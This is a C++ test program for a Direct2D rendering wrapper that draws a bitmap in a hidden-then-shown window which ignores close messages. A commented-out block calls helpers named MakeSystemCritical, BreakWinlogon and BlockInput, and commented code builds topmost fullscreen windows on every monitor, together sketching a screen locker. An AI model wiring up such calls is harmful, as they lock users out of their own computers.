#include "EZRenderer.h"
#include "EZWindow.h"
#include "EZProfiler.h"
#include "Helper.h"
#include "SysControl.h"
#include <thread>
#include <iostream>

EZ::Renderer* renderer;
EZ::Window* window;
EZ::Profiler* profiler;

LRESULT CALLBACK CustomWndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	if (uMsg == WM_CLOSE || uMsg == WM_DESTROY) {
		return 0; // We do not care
	}
	if (uMsg == WM_SIZE) {
		if (renderer != nullptr) {
			UINT32 newWidth = static_cast<UINT32>(LOWORD(lParam));
			UINT32 newHeight = static_cast<UINT32>(HIWORD(lParam));
			D2D1_SIZE_U newSize = D2D1::SizeU(newWidth, newHeight);
			//renderer->Resize(newSize);
		}
	}
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int main() {
	/*
	if (!IsAdmin()) {
		RelaunchAsAdmin();
		return 0;
	}

	if (!HasUIAccess()) {
		RelaunchWithUIAccess();
		return 0;
	}

	TakeSEDebugPrivilege();
	MakeSystemCritical();

	TakeSEDebugPrivilege();
	BreakWinlogon();

	BlockInput();
	*/

	try {
		profiler = new EZ::Profiler(1000);

		std::thread windowThread([]() {
			EZ::ClassSettings classSettings = { };
			classSettings.WndProc = CustomWndProc;
			//classSettings.NoCloseOption = TRUE;
			EZ::RegisterClass(classSettings);

			EZ::WindowSettings windowSettings = { };
			windowSettings.LaunchHidden = TRUE;
			//windowSettings.TopMost = TRUE;
			//windowSettings.StylePreset = EZ::WindowStylePreset::Boarderless;
			//windowSettings.InitialX = 0;
			//windowSettings.InitialY = 0;
			//windowSettings.InitialWidth = 1920;
			//windowSettings.InitialHeight = 1080;
			window = new EZ::Window(windowSettings);

			// Wait for renderer creation.
			while (renderer == nullptr) {}

			window->Show();

			window->Run();

			delete window;
			});
		windowThread.detach();

		// Wait for window creation. 
		while (window == nullptr) {}

		EZ::RendererSettings rendererSettings = { };
		renderer = new EZ::Renderer(window->GetHandle(), rendererSettings);

		ID2D1Bitmap* testImage = renderer->LoadBitmap(L"D:\\Coding\\C++\\D2DEZ\\D2DEZ\\Assets\\TestImage.png");
		D2D1_SIZE_U testImageSize = testImage->GetPixelSize();

		LARGE_INTEGER lastFrame = { };
		while (true) {
			D2D1_SIZE_U rendererSize = renderer->GetSize();
			RECT windowRect = window->GetBounds();
			if (windowRect.right - windowRect.left != rendererSize.width || windowRect.bottom - windowRect.top != rendererSize.height) {
				renderer->Resize(D2D1::SizeU(windowRect.right - windowRect.left, windowRect.bottom - windowRect.top));
			}

			renderer->BeginDraw();
			renderer->Clear(D2D1::ColorF(1.0, 0.75, 0.75, 1.0));
			renderer->FillRect(EZ::Rect(0, 0, 128, 72), D2D1::ColorF(1.0, 1.0, 1.0, 1.0));
			renderer->DrawBitmap(testImage, D2D1::Point2L(10, 10));
			renderer->EndDraw();

			profiler->Tick();
		}

		delete renderer;
		delete profiler;
	}
	catch (Error error) {
		error.PrintAndFree();
	}
	catch (...) {
		PrintError(L"Something unknown went wrong. This is a good time to sob!");
	}

	return 0;
}

/*
LRESULT CALLBACK WndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	return DefWindowProc(hwnd, uMsg, wParam, lParam);
}
void InitWndClass() {
	WNDCLASS wc = {};
	wc.style = CS_HREDRAW | CS_VREDRAW; // Redraw windows with this class on horizontal or vertical changes.
	wc.lpfnWndProc = WndProc;
	wc.cbClsExtra = 0; // Allocate 0 extra bytes after the class declaration.
	wc.cbWndExtra = 0; // Allocate 0 extra bytes after windows of this class.
	wc.hInstance = GetModuleHandle(nullptr);
	wc.hIcon = nullptr; // Default icon
	wc.hCursor = LoadCursor(nullptr, IDC_ARROW); // Default cursor from system cursors.
	wc.hbrBackground = CreateSolidBrush(RGB(0, 0, 0)); // User implamented painting.
	wc.lpszMenuName = nullptr; // No default menu
	wc.lpszClassName = L"MysteryWindowClass";
	::RegisterClass(&wc);
}



struct MonitorList {
	DWORD length;
	HMONITOR* list;
};
BOOL CALLBACK MonitorEnumProc(HMONITOR hMonitor, HDC hdcMonitor, LPRECT lprcMonitor, LPARAM dwData) {
	vector<HMONITOR>* monitors = reinterpret_cast<vector<HMONITOR>*>(dwData);

	monitors->push_back(hMonitor);

	return TRUE;
}
MonitorList GetMonitors() {
	vector<HMONITOR>* monitors = new vector<HMONITOR>();
	EnumDisplayMonitors(NULL, NULL, MonitorEnumProc, reinterpret_cast<LPARAM>(monitors));

	DWORD length = monitors->size();
	HMONITOR* monitorsArray = new HMONITOR[length];
	for (DWORD i = 0; i < length; ++i) {
		monitorsArray[i] = (*monitors)[i];
	}

	delete monitors;

	return { length, monitorsArray };
}



HWND CreateWnd(HMONITOR monitor) {
	MONITORINFO monitorInfo;
	monitorInfo.cbSize = sizeof(MONITORINFO);
	GetMonitorInfo(monitor, &monitorInfo);

	int x = monitorInfo.rcMonitor.left;
	int y = monitorInfo.rcMonitor.top;
	int width = monitorInfo.rcMonitor.right - monitorInfo.rcMonitor.left;
	int height = monitorInfo.rcMonitor.bottom - monitorInfo.rcMonitor.top;

	HWND handle = CreateWindowEx(
		WS_EX_TOPMOST, // Optional window styles
		L"MysteryWindowClass", // Window class name
		L"Mystery Window", // Window title
		WS_VISIBLE | WS_POPUP, // Window styles
		x, // X position
		y, // Y position
		width, // Width
		height, // Height
		nullptr, // Parent window
		nullptr, // Target menu
		GetModuleHandle(nullptr), // Instance handle
		nullptr // Additional data
	);

	return handle;
}



void PumpMessages() {
	MSG msg = {};
	while (GetMessage(&msg, nullptr, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
}



void RunWindows() {
	InitWndClass();

	MonitorList monitors = GetMonitors();
	HWND* windows = new HWND[monitors.length];

	for (DWORD i = 0; i < monitors.length; i++)
	{
		windows[i] = CreateWnd(monitors.list[i]);
	}

	PumpMessages();

	delete[] monitors.list;
}
*/